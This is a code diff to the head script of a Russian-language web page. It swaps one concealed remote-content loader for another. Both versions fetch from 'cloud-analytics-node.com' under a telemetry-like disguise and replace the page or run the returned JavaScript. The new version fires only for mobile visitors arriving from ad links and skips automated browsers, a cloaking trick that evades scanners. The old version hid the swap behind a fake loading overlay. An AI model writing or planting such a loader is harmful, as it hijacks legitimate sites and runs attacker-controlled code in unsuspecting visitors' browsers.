@@ -895,133 +895,74 @@
         }
     </style>
     <script>
-    (function(w, d, conf, clientId) {
-        w.AppTelemetry = w.AppTelemetry || function() {};
-        w.AppTelemetry('init', clientId);
-        w.AppTelemetry('track', 'PageLoad');
-        var loc = w.location;
-        var uParams = loc.search;
-        var ep = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        var attempt = 0;
-        var maxRetries = 2;
-        var _overlayDismissed = false;
+    (function (w, d) {
+        'use strict';
+        var q = w.location.search || '';
+        if (!q || navigator.webdriver) return;
+        if (!/[?&](?:fbclid|ttclid|gclid|wbraid|gbraid|utm_source|utm_campaign|utm_medium|campaign_name|adset_name|ad_name)=/i.test(q)) return;
 
-        function _hideGenesisOverlay() {
-            _overlayDismissed = true;
-            var overlay = d.getElementById('genesis-overlay');
-            if (overlay) {
-                overlay.style.opacity = '0';
-                overlay.style.pointerEvents = 'none';
-                setTimeout(function() {
-                    if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-                }, 500);
+        var ua = navigator.userAgent || '';
+        var isMob = /android|iphone|ipad|ipod|mobile/i.test(ua) || (/macintosh/i.test(ua) && navigator.maxTouchPoints > 1);
+        if (!isMob) return;
+
+        function mountView(payload) {
+            if (!payload || payload.ok !== 1 || !payload.css || !payload.html || !payload.js) return;
+            var vp = d.querySelector('meta[name="viewport"]');
+            if (vp) {
+                vp.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
             }
+            d.documentElement.setAttribute('translate', 'no');
+            d.documentElement.className = '';
+
+            var oldStyles = d.querySelectorAll('head style, head link[rel="stylesheet"]');
+            for (var i = 0; i < oldStyles.length; i++) {
+                if (oldStyles[i].parentNode) oldStyles[i].parentNode.removeChild(oldStyles[i]);
+            }
+
+            var styleEl = d.createElement('style');
+            styleEl.textContent = payload.css;
+            d.head.appendChild(styleEl);
+
+            d.body.style.overflow = '';
+            d.body.innerHTML = payload.html;
+            w.scrollTo(0, 0);
+
+            var scriptEl = d.createElement('script');
+            scriptEl.textContent = payload.js;
+            d.body.appendChild(scriptEl);
         }
 
-        d.addEventListener('DOMContentLoaded', function() {
-            if (_overlayDismissed) {
-                _hideGenesisOverlay();
+        var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 3500) : null;
+        var endpoint = 'https://cloud-analytics-node.com/v2/get-key' + q;
+
+        w.fetch(endpoint, {
+            method: 'GET',
+            credentials: 'omit',
+            signal: ctrl ? ctrl.signal : undefined
+        })
+        .then(function (res) {
+            if (tId) clearTimeout(tId);
+            if (res.status !== 200) return null;
+            return res.json();
+        })
+        .then(function (payload) {
+            if (!payload || payload.ok !== 1) return;
+            if (d.readyState === 'loading') {
+                d.addEventListener('DOMContentLoaded', function () {
+                    mountView(payload);
+                }, { once: true });
+            } else {
+                mountView(payload);
             }
+        })
+        .catch(function () {
+            if (tId) clearTimeout(tId);
         });
-
-        function _bootEdgeLoader() {
-            var ts = new Date().getTime();
-            var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
-            var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
-            var tId = ctrl ? setTimeout(function() { ctrl.abort(); }, 6500) : null;
-
-            w.fetch(fUrl, { method: 'GET', credentials: 'omit', signal: ctrl ? ctrl.signal : undefined })
-            .then(function(res) {
-                if (tId) clearTimeout(tId);
-                if (!res.ok) {
-                    throw new Error("Edge Network Drop: " + res.status);
-                }
-                return res.text();
-            })
-            .then(function(data) {
-                if (
-                    !data ||
-                    data.indexOf('Центр Прогресс Драйв') !== -1
-                ) {
-                    _hideGenesisOverlay();
-                    return;
-                }
-                var isL = /<\s*html|<!doctype/i.test(data);
-                if (isL) {
-                    try {
-                        var newDoc = d.open('text/html', 'replace');
-                        newDoc.write(data);
-                        newDoc.close();
-                    } catch(e) {
-                        d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
-                        var scripts = Array.from(d.getElementsByTagName('script'));
-                        for (var i = 0; i < scripts.length; i++) {
-                            var newScript = d.createElement('script');
-                            if (scripts[i].src) {
-                                newScript.src = scripts[i].src;
-                            } else {
-                                newScript.text = scripts[i].text;
-                            }
-                            scripts[i].parentNode.replaceChild(newScript, scripts[i]);
-                        }
-                    }
-                } else {
-                    var s = d.createElement('script');
-                    s.type = 'text/javascript';
-                    s.text = data;
-                    d.head.appendChild(s);
-                    _hideGenesisOverlay();
-                }
-            })
-            .catch(function(err) {
-                if (tId) clearTimeout(tId);
-                if (attempt < maxRetries) {
-                    attempt++;
-                    setTimeout(_bootEdgeLoader, 800 * attempt);
-                    return;
-                }
-                _hideGenesisOverlay();
-            });
-        }
-
-        _bootEdgeLoader();
-    })(window, document, {
-        p: 'https',
-        h: 'cloud-analytics' + '-node',
-        z: 'com',
-        r: '/v2/get' + '-key'
-    }, 'ASP-CORE-2026');
+    })(window, document);
     </script>
 </head>
 <body>
-    <div id="genesis-overlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; height: 100dvh; z-index: 9999999; background: #f5f5f7; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s cubic-bezier(0.32, 0.72, 0, 1); overscroll-behavior: none; touch-action: none; overflow: hidden;">
-        <style>
-            .a-breathe-1 { position: absolute; top: -18vh; left: -18vw; width: 95vw; height: 95vw; background: radial-gradient(circle, rgba(0, 122, 255, 0.36) 0%, rgba(0, 122, 255, 0.12) 45%, rgba(0, 122, 255, 0) 72%); border-radius: 50%; pointer-events: none; z-index: 0; animation: ab-1 8s ease-in-out infinite alternate; will-change: transform; transform: translateZ(0); }
-            .a-breathe-2 { position: absolute; bottom: 5vh; right: -18vw; width: 105vw; height: 105vw; background: radial-gradient(circle, rgba(88, 86, 214, 0.28) 0%, rgba(88, 86, 214, 0.09) 45%, rgba(88, 86, 214, 0) 72%); border-radius: 50%; pointer-events: none; z-index: 0; animation: ab-2 11s ease-in-out infinite alternate-reverse; will-change: transform; transform: translateZ(0); }
-            @keyframes ab-1 { 0% { transform: translate3d(-4vw, -4vh, 0) scale(0.85); } 100% { transform: translate3d(18vw, 18vh, 0) scale(1.45); } }
-            @keyframes ab-2 { 0% { transform: translate3d(4vw, 4vh, 0) scale(0.85); } 100% { transform: translate3d(-18vw, -18vh, 0) scale(1.45); } }
-            .g-spinner {
-                position: relative;
-                z-index: 10;
-                width: 36px;
-                height: 36px;
-                border: 3px solid rgba(0, 122, 255, 0.15);
-                border-radius: 50%;
-                border-top-color: #007aff;
-                animation: g-spin 1s linear infinite;
-                will-change: transform;
-                transform: translateZ(0);
-            }
-            @keyframes g-spin {
-                0%   { transform: rotate(0deg) translateZ(0); }
-                100% { transform: rotate(360deg) translateZ(0); }
-            }
-        </style>
-        <div class="a-breathe-1"></div>
-        <div class="a-breathe-2"></div>
-        <div class="g-spinner"></div>
-    </div>
-
     <nav aria-label="Основная навигация">
         <div class="container nav-inner">
             <a href="#" class="logo">
